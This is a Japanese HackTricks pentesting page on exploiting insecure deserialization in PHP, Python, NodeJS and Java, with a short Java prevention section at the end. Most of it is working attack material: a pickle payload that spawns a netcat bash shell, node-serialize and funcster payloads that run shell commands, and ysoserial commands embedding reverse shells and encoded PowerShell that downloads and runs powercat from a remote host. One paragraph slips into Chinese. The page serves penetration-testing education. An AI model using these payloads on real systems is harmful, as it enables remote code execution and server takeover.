# デシリアライゼーション

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じて、ゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい場合は** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live) **をフォロー**してください。
* **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出する。

</details>


## 基本情報

**シリアライゼーション**は、オブジェクトを保存したり通信プロセスの一部として送信するための形式に変換する方法として理解されます。この技術は、オブジェクトが後で再作成され、その構造と状態が維持されることを保証するために一般的に使用されます。

**デシリアライゼーション**は、逆に、シリアライゼーションを解除するプロセスです。特定の形式で構造化されたデータを取り、それをオブジェクトに再構築します。

デシリアライゼーションは危険である可能性があります。なぜなら、**攻撃者がシリアライズされたデータを操作して有害なコードを実行したり、オブジェクト再構築プロセス中にアプリケーションで予期しない動作を引き起こす可能性がある**からです。


## PHP

PHPでは、シリアライゼーションおよびデシリアライゼーションプロセス中に特定のマジックメソッドが使用されます:

* `__sleep`: オブジェクトがシリアライズされる際に呼び出されます。このメソッドは、シリアライズする必要があるオブジェクトのすべてのプロパティの名前の配列を返すべきです。保留中のデータを確定させたり、同様のクリーンアップタスクを実行するために一般的に使用されます。
* `__wakeup`: オブジェクトがデシリアライズされる際に呼び出されます。シリアライズ中に失われたデータベース接続を再確立したり、他の再初期化タスクを実行するために使用されます。
* `__unserialize`: このメソッドは、オブジェクトがデシリアライズされる際に `__wakeup` の代わりに呼び出されます（存在する場合）。`__wakeup` と比較して、デシリアライゼーションプロセスに対するより多くの制御を提供します。
* `__destruct`: このメソッドは、オブジェクトが破棄される直前またはスクリプトが終了する際に呼び出されます。ファイルハンドルを閉じたり、データベース接続を閉じたりするなどのクリーンアップタスクに通常使用されます。
* `__toString`: このメソッドはオブジェクトを文字列として扱うことを可能にします。ファイルの読み取りや、それに基づく他のタスクを行うために使用され、効果的にオブジェクトのテキスト表現を提供します。
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
結果を見ると、オブジェクトがデシリアライズされるときに、**`__wakeup`** 関数と **`__destruct`** 関数が呼び出されることがわかります。いくつかのチュートリアルでは、**`__toString`** 関数が属性を表示しようとするときに呼び出されると説明されていますが、**現在はそれが起こらなくなっている**ようです。

{% hint style="warning" %}
クラスで実装されている場合、**`__unserialize(array $data)`** メソッドが **`__wakeup()` の代わりに** 呼び出されます。これにより、シリアライズされたデータを配列として提供してオブジェクトをデシリアライズすることができます。このメソッドを使用してプロパティをデシリアライズし、デシリアライズ時に必要なタスクを実行することができます。
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

**PHPの例はこちらで説明されています**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/)、こちら [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) またはこちら [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

PHPのautoload機能を悪用して、任意のPHPファイルなどを読み込むことができます:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### 参照値のシリアル化

何らかの理由で、値を**他の値のシリアル化への参照としてシリアル化**したい場合があります:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc)を使用すると、PHPの逆シリアル化を悪用するペイロードを生成できます。\
いくつかのケースでは、アプリケーションのソースコードで逆シリアル化を悪用する方法を見つけることができないかもしれませんが、**外部のPHP拡張機能のコードを悪用することができる**かもしれません。\
したがって、サーバーの`phpinfo()`をチェックし、インターネット上（**PHPGGC**の**ガジェット**を含む）で悪用できる可能性のあるガジェットを**検索**してください。

### phar:// metadata deserialization

ファイルを読み取り、その中のPHPコードを実行しないLFIを見つけた場合、たとえば`file_get_contents()`、`fopen()`、`file()`、`file_exists()`、`md5_file()`、`filemtime()`、`filesize()`などの関数を使用している場合、**ファイル**を**読み取る**際に発生する**逆シリアル化**を悪用することができます。\
詳細については、次の投稿を読んでください：

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

オブジェクトがアンピクルされると、関数 _\_\_reduce\_\__ が実行されます。\
悪用されると、サーバーがエラーを返す可能性があります。
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
**Pickle jails** からの脱出に関する詳細は、以下を参照してください：

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

次のページでは、**YAML Pythonライブラリでの安全でない逆シリアル化を悪用**する技術が紹介され、**Pickle、PyYAML、jsonpickle、ruamel.yaml** 用のRCE逆シリアル化ペイロードを生成するために使用できるツールで終了します：

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### クラスポリューション（Pythonプロトタイプポリューション）

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Magic Functions

JSにはPHPやPythonのような**"マジック"関数**はありませんが、オブジェクトを作成するために実行される関数があります。ただし、**`toString`**、**`valueOf`**、**`toJSON`**など、**直接呼び出さなくても頻繁に使用される関数**があります。\
逆シリアル化を悪用すると、これらの関数を**妥協して他のコードを実行**できます（プロトタイプポリューションを悪用する可能性があります）。これらの関数が呼び出されるときに任意のコードを実行できます。

別の**関数を直接呼び出さずに呼び出す** **"マジック"方法**は、**非同期関数**（プロミス）によって返されるオブジェクトを**妥協する**ことです。なぜなら、その**返されたオブジェクト**を別の**プロミス**に**変換**し、**関数型の"then"プロパティ**を持つと、別のプロミスによって返されるため、**実行**されるからです。詳細は[_**このリンク**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _を参照してください。_
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` と `prototype` の汚染

このテクニックについて学びたい場合は、**次のチュートリアルを参照してください**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

このライブラリは、関数をシリアル化することを可能にします。例：
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
**シリアライズされたオブジェクト**は次のようになります：
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
例では、関数がシリアル化されると、シリアル化されたオブジェクトに `_$$ND_FUNC$$_` フラグが追加されます。

`node-serialize/lib/serialize.js` ファイル内に同じフラグが見つかり、コードがどのように使用されているかがわかります。

![](<../../.gitbook/assets/image (297).png>)

![](<../../.gitbook/assets/image (298).png>)

最後のコードチャンクで見られるように、**フラグが見つかった場合**、`eval` が使用されて関数の逆シリアル化が行われます。つまり、**ユーザー入力が `eval` 関数内で使用されている**ことになります。

ただし、関数を単にシリアル化するだけでは、それを実行することはできません。例では、コードの一部が `y.rce` を呼び出している必要があり、それは非常に**望ましくない**です。\
とにかく、シリアル化されたオブジェクトを**変更して括弧を追加**するだけで、オブジェクトが逆シリアル化されるときにシリアル化された関数が自動的に実行されるようにすることができます。\
次のコードチャンクでは、**最後の括弧**に注目し、`unserialize` 関数がコードを自動的に実行する方法に注目してください：
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
如先前所指出，此库将获取`_$$ND_FUNC$$_`后的代码，并使用`eval`来**执行**它。因此，为了**自动执行代码**，您可以**删除函数创建**部分和最后的括号，**只需执行一个JS单行代码**，就像以下示例中一样：
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
以下は、この脆弱性を悪用する方法に関する詳細情報を[**こちら**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)で見つけることができます。

### [funcster](https://www.npmjs.com/package/funcster)

**funcster**の注目すべき側面は、**標準組み込みオブジェクト**へのアクセスの制限です。これらはアクセス可能な範囲外にあります。この制限により、組み込みオブジェクトのメソッドを呼び出そうとするコードの実行が阻止され、`"ReferenceError: console is not defined"`のような例外が発生します。例えば、`console.log()`や`require(something)`などのコマンドを使用するとこのような例外が発生します。

ただし、特定のアプローチを使用することで、グローバルコンテキストへの完全なアクセス、すべての標準組み込みオブジェクトへのアクセスを復元することが可能です。グローバルコンテキストを直接活用することで、この制限をバイパスすることができます。たとえば、以下のスニペットを使用してアクセスを再確立することができます。
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**詳細については、[このソースを読んでください](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**。

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

**serialize-javascript** パッケージは、シリアル化のためだけに設計されており、組み込みの逆シリアル化機能を持っていません。ユーザーは、自分自身の逆シリアル化メソッドを実装する責任があります。直接 `eval` の使用が、シリアル化されたデータを逆シリアル化するための公式の例で提案されています。
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
この関数を使用してオブジェクトを逆シリアル化すると、**簡単に悪用**できます。
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**詳細については、[このソースを読んでください](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**。

### Cryoライブラリ

このライブラリを悪用して任意のコマンドを実行する方法についての情報を以下のページで見つけることができます：

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Javaでは、**逆シリアル化コールバックは逆シリアル化プロセス中に実行されます**。この実行は、悪意のあるペイロードを作成し、これらのコールバックをトリガーすることで悪意のあるアクションの実行が可能になる攻撃者によって悪用される可能性があります。

### フィンガープリント

#### ホワイトボックス

コードベース内の潜在的なシリアル化の脆弱性を特定するには、以下を検索してください：

* `Serializable` インターフェースを実装するクラス。
* `java.io.ObjectInputStream`、`readObject`、`readUnshare` 関数の使用。

特に注意すべき点：

* 外部ユーザーによって定義されたパラメーターを使用する `XMLDecoder`。
* 特にXStreamバージョンが1.46以下の場合、`XStream`の `fromXML` メソッド。これはシリアル化の問題に対して脆弱です。
* `ObjectInputStream` と `readObject` メソッドの組み合わせ。
* `readObject`、`readObjectNodData`、`readResolve`、または `readExternal` などのメソッドの実装。
* `ObjectInputStream.readUnshared`。
* `Serializable` の一般的な使用。

#### ブラックボックス

ブラックボックステストでは、`ObjectInputStream` から派生したJavaシリアル化オブジェクトを示す特定の **シグネチャまたは "マジックバイト"** を探してください：

* 16進数パターン：`AC ED 00 05`。
* Base64パターン：`rO0`。
* `Content-type` が `application/x-java-serialized-object` に設定されたHTTPレスポンスヘッダー。
* 圧縮前を示す16進数パターン：`1F 8B 08 00`。
* 圧縮前を示すBase64パターン：`H4sIA`。
* `.faces` 拡張子と `faces.ViewState` パラメーターを持つWebファイル。Webアプリケーションでこれらのパターンを発見した場合は、[Java JSF ViewState Deserializationに関する投稿](java-jsf-viewstate-.faces-deserialization.md)の詳細な調査を促すべきです。
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### 脆弱性があるかどうかをチェックする

**Java Deserialized exploitの動作原理を学びたい**場合は、[**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md)、[**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md)、および[**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md)を参照してください。

#### ホワイトボックステスト

既知の脆弱性を持つアプリケーションがインストールされていないかどうかをチェックすることができます。
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
**脆弱性のあるすべてのライブラリ**をチェックして、[**Ysoserial**](https://github.com/frohoff/ysoserial)がエクスプロイトを提供できることが知られているライブラリを確認することができます。または、[Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json)で示されているライブラリをチェックすることもできます。\
また、[**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector)を使用して、悪用できる可能性のあるガジェットチェーンを検索することができます。\
**gadgetinspector**を実行する際（ビルド後）、通過する多くの警告/エラーに気にせず、完了させてください。すべての調査結果は_gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_の下に書き込まれます。**gadgetinspectorはエクスプロイトを作成せず、誤検知を示す可能性があります**。

#### ブラックボックステスト

Burp拡張機能[**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md)を使用すると、**使用可能なライブラリ（バージョンも含む）を特定**できます。この情報を使用すると、脆弱性を悪用するためのペイロードを選択するのが**簡単になる**かもしれません。\
[GadgetProbeについて詳しくはこちらを読んでください](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**。**\
GadgetProbeは**`ObjectInputStream`の逆シリアル化**に焦点を当てています。

Burp拡張機能[**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)を使用すると、ysoserialを使用して**脆弱なライブラリを特定**し、それらを**悪用**することができます。\
[Java Deserialization Scannerについて詳しくはこちらを読んでください](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scannerは**`ObjectInputStream`**の逆シリアル化に焦点を当てています。

また、[**Freddy**](https://github.com/nccgroup/freddy)を使用して、**Burp**内の**逆シリアル化**脆弱性を検出することができます。このプラグインは、**`ObjectInputStream`**関連の脆弱性だけでなく、**Json**および**Yml**逆シリアル化ライブラリの脆弱性も検出します。アクティブモードでは、スリープまたはDNSペイロードを使用してそれらを確認しようとします。\
[Freddyに関する詳細情報はこちらで確認できます](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**シリアル化テスト**

サーバーで使用されている脆弱なライブラリをチェックするだけではありません。時には、シリアル化オブジェクト内のデータを変更して、一部のチェックをバイパスできるかもしれません（たとえば、Webアプリ内で管理者権限を付与できるかもしれません）。\
Webアプリケーションに送信されるJavaシリアル化オブジェクトを見つけた場合、[**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper)を使用して、送信されるシリアル化オブジェクトをより人間が読みやすい形式で表示できます。送信しているデータを知ることで、それを変更して一部のチェックをバイパスするのが簡単になります。

### **エクスプロイト**

#### **ysoserial**

Java逆シリアル化を悪用するための主要ツールは[**ysoserial**](https://github.com/frohoff/ysoserial)です（[**こちらからダウンロード**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)）。複雑なコマンド（たとえば、パイプを使用したもの）を使用できるようにする[**ysoseral-modified**](https://github.com/pimps/ysoserial-modified)を使用することも検討できます。\
このツールは**`ObjectInputStream`**の悪用に焦点を当てています。\
可能であれば、インジェクションが可能かどうかをテストするために、**RCE**ペイロードの前に**「URLDNS」**ペイロードを使用することをお勧めします。とにかく、「URLDNS」ペイロードが機能しないかもしれませんが、他のRCEペイロードは機能するかもしれません。
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
**java.lang.Runtime.exec()**のペイロードを作成する際、実行の出力をリダイレクトするための特殊文字（">"や"|"）や、コマンドを実行するための"$()"、コマンドにスペースで区切られた引数を渡すことはできません（`echo -n "hello world"`はできますが、`python2 -c 'print "Hello world"'`はできません）。ペイロードを正しくエンコードするためには、[このウェブページ](http://www.jackson-t.ca/runtime-exec-payloads.html)を使用できます。

次のスクリプトを使用して、WindowsとLinux用の**すべての可能なコード実行**ペイロードを作成し、その脆弱なウェブページでテストしてください。
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### シリアルキラーバイパスガジェット

[**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **を使用して、ysoserialと組み合わせてより多くのエクスプロイトを作成できます**。このツールに関する詳細は、ツールが発表された**スライド**で確認できます: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec**](https://github.com/mbechler/marshalsec)は、Javaの異なる**Json**および**Yml**シリアライゼーションライブラリを悪用するペイロードを生成するために使用できます。\
プロジェクトをコンパイルするために、`pom.xml`にこの**依存関係**を**追加する必要がありました**:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Mavenをインストール**し、プロジェクトを**コンパイル**してください:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

このJava JSONライブラリについて詳しくはこちらを参照してください: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* いくつかのysoserialペイロードをテストしたい場合は、**このWebアプリ**を実行できます: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Why

Javaはさまざまな目的でシリアル化を多用しています:

- **HTTPリクエスト**: シリアル化は、パラメータ、ViewState、クッキーの管理などで広く利用されています。
- **RMI (Remote Method Invocation)**: 完全にシリアル化に依存するJava RMIプロトコルは、Javaアプリケーションのリモート通信の基盤です。
- **RMI over HTTP**: この方法は、シリアル化を利用してすべてのオブジェクト通信を行うJavaベースの厚いクライアントWebアプリケーションによく使用されます。
- **JMX (Java Management Extensions)**: JMXはネットワークを介してオブジェクトを転送するためにシリアル化を利用しています。
- **カスタムプロトコル**: Javaでは、標準的な方法として、今後のエクスプロイト例で示されるように、生のJavaオブジェクトの転送が行われます。

### Prevention

#### 一時的なオブジェクト

`Serializable`を実装するクラスは、シリアル化されてはいけないクラス内のオブジェクトを`transient`として実装できます。例:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### `Serializable` インターフェースを実装する必要があるクラスのシリアライズを回避する

特定の**オブジェクトがクラス階層のために`Serializable`インターフェースを実装する必要がある**シナリオでは、意図しない逆シリアル化のリスクがあります。これを防ぐために、以下に示すように、`final` `readObject()` メソッドを定義して一貫して例外をスローすることで、これらのオブジェクトが逆シリアル化できないようにします。
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Javaにおける逆シリアル化セキュリティの強化**

`java.io.ObjectInputStream`をカスタマイズすることは、逆シリアル化プロセスを保護するための実用的なアプローチです。この方法は、次の場合に適しています:

- 逆シリアル化コードがあなたの管理下にある場合。
- 逆シリアル化に必要なクラスが既知の場合。

**`resolveClass()`** メソッドをオーバーライドして、許可されたクラスに逆シリアル化を制限します。これにより、`Bicycle`クラスのように明示的に許可されたクラス以外のクラスの逆シリアル化を防ぎます。
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**セキュリティ強化のためのJavaエージェントの使用**は、コードの変更が不可能な場合のフォールバックソリューションを提供します。この方法は主に**有害なクラスをブラックリスト化**するためにJVMパラメータを使用します：
```
-javaagent:name-of-agent.jar
```
デシリアル化を動的に保護する方法を提供し、即座のコード変更が実用的でない環境に最適です。

[rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0) で例を確認してください。

